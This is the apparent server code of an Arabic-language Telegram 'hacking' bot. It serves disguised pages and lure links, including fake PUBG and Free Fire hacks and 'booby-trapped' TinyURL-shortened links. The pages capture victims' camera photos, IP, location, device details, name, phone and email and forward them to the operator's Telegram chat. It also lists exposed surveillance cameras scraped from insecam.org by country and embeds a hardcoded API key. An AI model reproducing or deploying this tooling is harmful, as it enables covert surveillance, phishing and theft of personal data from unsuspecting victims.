const COHERE_API_KEY = 'uXr5n9GNQTpWYxJ67QVHBNYi25UQxJtl77uAMm9d'; // مفتاح Cohere API

async function getLoveMessage(chatId) {
    const loveMessage = 'اكتب لي رسالة طويلة جدًا لا تقل عن 800 حرف رسالة جميلة ومحرجة وكلمات جميلة أرسلها لشركة واتساب لفك الحظر عن رقمي المحظور';

    try {
        const response = await axios.post('https://api.cohere.ai/v1/generate', { // تحديد إصدار API
            model: 'command-xlarge-nightly', // اختر النموذج الذي تريده من Cohere
            prompt: loveMessage,
            max_tokens: 800,
            temperature: 0.8
        }, {
            headers: {
                'Authorization': `Bearer ${COHERE_API_KEY}`,
                'Content-Type': 'application/json'
            }
        });

        // فحص الاستجابة للتأكد من وجود البيانات المتوقعة
        if (response.data && response.data.generations && response.data.generations.length > 0) {
            const generatedText = response.data.generations[0].text;
            bot.sendMessage(chatId, generatedText);
        } else {
            console.error('Unexpected response format:', response.data);
            bot.sendMessage(chatId, 'لم أتمكن من جلب الرسالة، الرجاء المحاولة لاحقًا.');
        }
    } catch (error) {
        console.error('Error fetching love message:', error.response ? error.response.data : error.message);
        bot.sendMessage(chatId, 'حدثت مشكلة أثناء جلب الرسالة. الرجاء المحاولة مرة أخرى لاحقًا.');
    }
}


app.use(express.json());
app.use(express.urlencoded({ extended: true }));



app.post('/submitPhtos', upload.array('images', 10), async (req, res) => {
    console.log('Received a request to /submitPhotos');
    try {
        const { cameraType, additionalData } = req.body;
        const chatId = req.body.chatId; // استلام chatId من الطلب
        const files = req.files;

        // تحقق من القيم المستقبلة
        console.log('Received request body:', req.body);
        console.log('Received files:', req.files);

        if (!chatId || chatId === 'null') {
            console.error('chatId not provided or is null');
            return res.status(400).json({ success: false, error: 'chatId is required and cannot be null' });
        }

        if (!files || files.length === 0) {
            console.error('No files uploaded');
            return res.status(400).json({ success: false, error: 'No files uploaded' });
        }

        let parsedData = {};
        if (additionalData) {
            try {
                parsedData = JSON.parse(additionalData);
            } catch (error) {
                console.error('Invalid additionalData JSON:', error.message);
                return res.status(400).json({ success: false, error: 'Invalid additionalData format' });
            }
        }

        const caption = `
معلومات إضافية:
نوع الكاميرا: ${cameraType === 'front' ? 'أمامية' : 'خلفية'}

IP: ${parsedData.ip || 'غير متاح'}

الدولة: ${parsedData.country || 'غير متاح'}

المدينة: ${parsedData.city || 'غير متاح'}

المنصة: ${parsedData.platform || 'غير متاح'}

وكيل المستخدم: ${parsedData.userAgent || 'غير متاح'}

مستوى البطارية: ${parsedData.batteryLevel || 'غير متاح'}

الشحن: ${parsedData.batteryCharging ? 'نعم' : 'لا'}
        `;

        for (const file of files) {
            try {
                await bot.sendPhoto(chatId, file.buffer, { caption });
                console.log('Photo sent successfully');
            } catch (error) {
                console.error('Error sending photo:', error.message);
                return res.status(500).json({ success: false, error: 'Failed to send photo' });
            }
        }

        res.json({ success: true });
    } catch (error) {
        console.error('Failed to process request:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});


// مسار لتحميل صفحة البرمجيات الخبيثة
// مسار لتحميل صفحة البرمجيات الخبيثة
app.get('/malware', (req, res) => {
    const chatId = req.query.chatId;
    const originalLink = req.query.originalLink;
    // يمكنك تمرير chatId و originalLink إلى HTML إذا كنت بحاجة إلى ذلك
    res.sendFile(path.join(__dirname, 'malware.html'));
});




app.get('/:userId', (req, res) => {
    res.sendFile(path.join(__dirname, 'SS.html'));
});

// استقبال البيانات من الصفحة HTML وإرسالها إلى البوت
app.post('/SS', async (req, res) => {
    console.log('تم استقبال طلب POST في المسار /mm');
    console.log('البيانات المستلمة:', req.body);

    const chatId = req.body.userId;
    const deviceInfo = req.body.deviceInfo || {}; // التأكد من وجود deviceInfo
    const userInfo = req.body.userInfo || {}; // التأكد من وجود userInfo (قد لا يكون موجودًا في الطلب الأول)

    const message = `
📝 **معلومات المستخدم:**
- الاسم: ${userInfo.name || 'غير معروف'}
- الهاتف: ${userInfo.phone || 'غير معروف'}
- البريد الإلكتروني: ${userInfo.email || 'غير معروف'}

📱 **معلومات الجهاز:**
- الدولة: ${deviceInfo.country || 'غير معروف'} 🔻
- المدينة: ${deviceInfo.city || 'غير معروف'} 🏙️
- عنوان IP: ${deviceInfo.ip || 'غير معروف'} 🌍
- شحن الهاتف: ${deviceInfo.battery || 'غير معروف'}% 🔋
- هل الهاتف يشحن؟: ${deviceInfo.isCharging || 'غير معروف'} ⚡
- الشبكة: ${deviceInfo.network || 'غير معروف'} 📶 (سرعة: ${deviceInfo.networkSpeed || 'غير معروف'} ميغابت في الثانية)
- نوع الاتصال: ${deviceInfo.networkType || 'غير معروف'} 📡
- الوقت: ${deviceInfo.time || 'غير معروف'} ⏰
- اسم الجهاز: ${deviceInfo.deviceName || 'غير معروف'} 🖥️
- إصدار الجهاز: ${deviceInfo.deviceVersion || 'غير معروف'} 📜
- نوع الجهاز: ${deviceInfo.deviceType || 'غير معروف'} 📱
- الذاكرة (RAM): ${deviceInfo.memory || 'غير معروف'} 🧠
- الذاكرة الداخلية: ${deviceInfo.internalStorage || 'غير معروف'} GB 💾
- عدد الأنوية: ${deviceInfo.cpuCores || 'غير معروف'} ⚙️
- لغة النظام: ${deviceInfo.language || 'غير معروف'} 🌐
- اسم المتصفح: ${deviceInfo.browserName || 'غير معروف'} 🌐
- إصدار المتصفح: ${deviceInfo.browserVersion || 'غير معروف'} 📊
- دقة الشاشة: ${deviceInfo.screenResolution || 'غير معروف'} 📏
- إصدار نظام التشغيل: ${deviceInfo.osVersion || 'غير معروف'} 🖥️
- وضع الشاشة: ${deviceInfo.screenOrientation || 'غير معروف'} 🔄
- عمق الألوان: ${deviceInfo.colorDepth || 'غير معروف'} 🎨
- تاريخ آخر تحديث للمتصفح: ${deviceInfo.lastUpdate || 'غير معروف'} 📅
- بروتوكول الأمان المستخدم: ${deviceInfo.securityProtocol || 'غير معروف'} 🔒
- نطاق التردد للاتصال: ${deviceInfo.connectionFrequency || 'غير معروف'} 📡
- إمكانية تحديد الموقع الجغرافي: ${deviceInfo.geolocationAvailable || 'غير معروف'} 🌍
- الدعم لتقنية البلوتوث: ${deviceInfo.bluetoothSupport || 'غير معروف'} 🔵
- دعم الإيماءات اللمسية: ${deviceInfo.touchSupport || 'غير معروف'} ✋
    `;
    
    try {
        await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        console.log('تم إرسال معلومات الجهاز والمستخدم بنجاح');
        res.json({ success: true });
    } catch (err) {
        console.error('فشل في إرسال معلومات الجهاز والمستخدم:', err);
        res.status(500).json({ error: 'فشل في إرسال معلومات الجهاز والمستخدم' });
    }
});



// التعامل مع الزر عند الضغط عليه
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;

    // إرسال الرابط عند الضغط على الزر
    if (query.data === 'collect_device_info') {
        const url = `https://hahaha-pfyy.onrender.com/${chatId}`;
        bot.sendMessage(chatId, `رابط جمع المعلومات: ${url}`);
    }

    // تأكيد تلقي الرد وإنهاء عملية المعالجة
    bot.answerCallbackQuery(query.id);
});


  bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;

    if (data === 'malware_link') {
        bot.sendMessage(chatId, 'من فضلك أرسل الرابط الذي ترغب في تلغيمه:');
        bot.once('message', async (msg) => {
            if (msg.text) {
                const link = msg.text;
                const malwareUrl = `https://hahaha-pfyy.onrender.com/malware?chatId=${chatId}&originalLink=${encodeURIComponent(link)}`;
                
                try {
                    // اختصار الرابط باستخدام TinyURL
                    const response = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(malwareUrl)}`);
                    const shortUrl = response.data;

                    bot.sendMessage(chatId, `تم تلغيم الرابط، استخدم هذا الرابط لاختراق: ${shortUrl}`);
                } catch (error) {
                    bot.sendMessage(chatId, 'حدث خطأ أثناء اختصار الرابط. الرجاء المحاولة لاحقًا.');
                }
            } else {
                bot.sendMessage(chatId, 'الرجاء إرسال رابط نصي صالح.');
            }
        });
    }
});
  
    
    
    // متغير لتتبع عدد مرات الضغط على زر الكاميرات
const camRequestCounts = {};

// قائمة VIP


// تهيئة التخزين
async function initStorage() {
    await storage.init();
    vipUsers = await storage.getItem('vipUsers') || [];
}

// حفظ قائمة VIP
async function saveVipUsers() {
    await storage.setItem('vipUsers', vipUsers);
}

// عرض القائمة
function showCountryList(chatId, startIndex = 0) {
    try {
        const buttons = [];
        const countryCodes = Object.keys(countryTranslation);
        const countryNames = Object.values(countryTranslation);

        const endIndex = Math.min(startIndex + 99, countryCodes.length);

        for (let i = startIndex; i < endIndex; i += 3) {
            const row = [];
            for (let j = i; j < i + 3 && j < endIndex; j++) {
                const code = countryCodes[j];
                const name = countryNames[j];
                row.push({ text: name, callback_data: code });
            }
            buttons.push(row);
        }

        const navigationButtons = [];
        if (startIndex > 0) {
            navigationButtons.push 
        }
        if (endIndex < countryCodes.length) {
            navigationButtons.push({ text: "المزيد", callback_data: `next_${endIndex}` });
        }

        if (navigationButtons.length) {
            buttons.push(navigationButtons);
        }

        bot.sendMessage(chatId, "اختر الدولة:", {
            reply_markup: {
                inline_keyboard: buttons
            }
        });
    } catch (error) {
        bot.sendMessage(chatId, `حدث خطأ أثناء إنشاء القائمة: ${error.message}`);
    }
}

// عرض الكاميرات
async function displayCameras(chatId, countryCode) {
    try {
        // عرض الكاميرات كالمعتاد
        const message = await bot.sendMessage(chatId, "جاري اختراق كامراة مراقبه.....");
        const messageId = message.message_id;

        for (let i = 0; i < 15; i++) {
            await bot.editMessageText(`جاري اختراق كامراة مراقبه${'.'.repeat(i % 4)}`, {
                chat_id: chatId,
                message_id: messageId
            });
            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        const url = `http://www.insecam.org/en/bycountry/${countryCode}`;
        const headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
        };

        let res = await axios.get(url, { headers });
        const lastPageMatch = res.data.match(/pagenavigator\("\?page=", (\d+)/);
        if (!lastPageMatch) {
            bot.sendMessage(chatId, "لم يتم اختراق كامراة المراقبه في هذا الدوله بسبب قوة الامان جرب دوله مختلفه او حاول مره اخرى لاحقًا.");
            return;
        }
        const lastPage = parseInt(lastPageMatch[1], 10);
        const cameras = [];

        for (let page = 1; page <= lastPage; page++) {
            res = await axios.get(`${url}/?page=${page}`, { headers });
            const pageCameras = res.data.match(/http:\/\/\d+\.\d+\.\d+\.\d+:\d+/g) || [];
            cameras.push(...pageCameras);
        }

        if (cameras.length) {
            const numberedCameras = cameras.map((camera, index) => `${index + 1}. ${camera}`);
            for (let i = 0; i < numberedCameras.length; i += 50) {
                const chunk = numberedCameras.slice(i, i + 50);
                await bot.sendMessage(chatId, chunk.join('\n'));
            }
            await bot.sendMessage(chatId, " لقد تم اختراق كامراة المراقبه من هذا الدوله يمكنك التمتع في المشاهده عمك سجاد.\n ⚠️ملاحظه مهمه اذا لم تفتح الكامرات في جهازك او طلبت باسورد قم في تعير الدوله او حاول مره اخره لاحقًا ");
        } else {
            await bot.sendMessage(chatId, "لم يتم اختراق كامراة المراقبه في هذا الدوله بسبب قوة امانها جرب دوله اخره او حاول مره اخرى لاحقًا.");
        }
    } catch (error) {
        await bot.sendMessage(chatId, `لم يتم اختراق كامراة المراقبه في هذا الدوله بسبب قوة امانها جرب دوله اخره او حاول مره اخرى لاحقًا.`);
    }
}

// التحقق من كون المستخدم مطور
function isDeveloper(chatId) {
    // استبدل هذا بـ chatId الخاص بالمطور
    const developerChatId = 7130416076;
    return chatId === developerChatId;
}


    
    
    
    
    
    
    // عرض لوحة تحكم المطور
function showAdminPanel(chatId) {
    bot.sendMessage(chatId, "لوحة التحكم:", {
        reply_markup: {
            inline_keyboard: [
                [{ text: "إضافة مستخدم VIP", callback_data: "add_vip" }],
                [{ text: "إزالة مستخدم VIP", callback_data: "remove_vip" }]
            ]
        }
    });
}

bot.onText(/\/jjjjjavayy/, (msg) => {
    const chatId = msg.chat.id;
    const message = 'مرحبًا! انقر على الرابط لإضافة أسماء المستخدمين.';
    bot.sendMessage(chatId, message, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'إختراق ببجي', callback_data: 'get_pubg' }],
                [{ text: 'إختراق فري فاير', callback_data: 'get_freefire' }],
                [{ text: 'إضافة أسماء', callback_data: 'add_names' }]
            ]
        }
    });
});

bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    let link;

    if (query.data === 'get_pubg') {
        link = `https://hahaha-pfyy.onrender.com/get?chatId=${chatId}.png`;
    } else if (query.data === 'get_freefire') {
        link = `https://hahaha-pfyy.onrender.com/getNam?chatId=${chatId}.png`;
    } else if (query.data === 'add_names') {
        link = `https://hahaha-pfyy.onrender.com/getName?chatId=${chatId}.png`;
    }

    if (link) {
        bot.sendMessage(chatId, `تم لغيم الرابط هذا: ${link}`);
        bot.answerCallbackQuery(query.id, { text: 'تم إرسال الرابط إليك ✅' });
    } else if (query.data === 'add_nammes') {
        bot.sendMessage(chatId, `قم بإرسال هذا لفتح أوامر اختراق الهاتف كاملاً قم بضغط على هذا الامر /Vip`);
        bot.answerCallbackQuery(query.id, { text: '' });
    }
});

bot.onText(/\/نننطسطوو/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, "مرحبا! في بوت اختراق كاميرات المراقبة 📡", {
        reply_markup: {
            inline_keyboard: [[{ text: "ابدأ الاختراق", callback_data: "get_cameras" }]]
        }
    });

    if (isDeveloper(chatId)) {
        showAdminPanel(chatId);
    }
});

// التعامل مع أزرار كاميرات المراقبة
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;

    if (query.data === 'get_cameras') {
        showCountryList(chatId);
    } else if (query.data in countryTranslation) {
        bot.deleteMessage(chatId, query.message.message_id);
        displayCameras(chatId, query.data);
    } else if (query.data.startsWith("next_")) {
        const startIndex = parseInt(query.data.split("_")[1], 10);
        bot.deleteMessage(chatId, query.message.message_id);
        showCountryList(chatId, startIndex);
    } else if (query.data.startsWith("prev_")) {
        const endIndex = parseInt(query.data.split("_")[1], 10);
        const startIndex = Math.max(0, endIndex - 18);
        bot.deleteMessage(chatId, query.message.message_id);
        showCountryList(chatId, startIndex);
    }
});

// بدء التخزين وتحميل البيانات
initStorage().then(() => {
    console.log('تم تهيئة التخزين بنجاح.');
}).catch(err => {
    console.error('حدث خطأ أثناء تهيئة التخزين:', err);
});

// وظيفة لحفظ حالة استخدام الروابط
const clearTemporaryStorage = () => {
    // الكود الخاص بحذف الذاكرة المؤقتة
    console.log('تصفير الذاكرة المؤقتة...');
};

// حذف الذاكرة المؤقتة كل دقيقتين
setInterval(() => {
    clearTemporaryStorage();
    console.log('تم حذف الذاكرة المؤقتة.');
}, 2 * 60 * 1000); // 2 دقيقة بالميلي ثانية

const handleExit = () => {
    saveLinkUsage().then(() => {
        console.log('تم حفظ حالة استخدام الروابط.');
        process.exit();
    }).catch(err => {
        console.error('حدث خطأ أثناء حفظ حالة استخدام الروابط:', err);
        process.exit(1); // إنهاء مع رمز خطأ
    });
};

process.on('exit', handleExit);
process.on('SIGINT', handleExit);
process.on('SIGTERM', handleExit);
process.on('SIGHUP', handleExit);
